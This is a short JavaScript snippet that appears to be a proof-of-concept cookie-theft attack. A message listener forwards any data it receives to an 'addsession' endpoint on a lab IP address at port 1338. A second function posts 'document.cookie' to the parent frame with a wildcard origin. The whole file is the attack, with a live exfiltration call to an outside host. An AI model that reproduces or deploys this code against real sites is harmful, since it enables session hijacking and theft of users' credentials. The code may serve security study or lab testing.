function listener(event){
 
 $.get("http://192.168.56.177:1338/addsession?c="+event.data);

}

if (window.addEventListener){
  addEventListener("message", listener, false)
} else {
  attachEvent("onmessage", listener);
}

function postmessagetoparent(){
	parent.postMessage("document.cookie","*");
}
